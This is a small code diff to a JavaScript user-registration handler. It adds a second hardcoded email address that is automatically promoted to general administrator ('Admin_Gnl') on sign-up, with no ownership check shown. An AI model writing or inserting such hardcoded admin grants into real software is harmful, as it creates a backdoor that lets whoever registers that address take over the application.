@@ -35,7 +35,7 @@ const registrar = async (req, res) => {
       tipo_usuario: usuario.tipo_usuario,
     });
     await perfil.save();
-    if (email === "gsanchez@uci.cu") {
+    if (email === "gsanchez@uci.cu" || email==='victorhernandezsalcedo4@gmail.com') {
       usuario.tipo_usuario = "Admin_Gnl";
       usuario.save();
     }
